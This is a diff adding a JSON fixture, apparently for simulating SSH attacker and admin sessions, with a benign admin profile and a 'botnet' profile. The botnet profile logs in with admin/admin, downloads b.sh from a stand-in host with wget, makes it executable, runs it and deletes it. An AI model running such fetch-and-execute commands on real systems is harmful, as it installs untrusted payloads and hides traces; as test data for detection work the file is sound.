@@ -1,0 +1,36 @@
+{
+  "benign_admin": {
+    "seed": 1,
+    "pacing_seed": 9201,
+    "credentials": [
+      [
+        "ubuntu",
+        "Adm1n#2026"
+      ]
+    ],
+    "planned_commands": [
+      "w",
+      "du -sh /var/log",
+      "cat /proc/meminfo",
+      "pwd",
+      "tail -n 50 /var/log/syslog"
+    ]
+  },
+  "botnet": {
+    "seed": 7,
+    "pacing_seed": 9202,
+    "credentials": [
+      [
+        "admin",
+        "admin"
+      ]
+    ],
+    "planned_commands": [
+      "cd /dev/shm",
+      "wget http://mirror.example/b.sh",
+      "chmod +x b.sh",
+      "./b.sh",
+      "rm -rf b.sh"
+    ]
+  }
+}
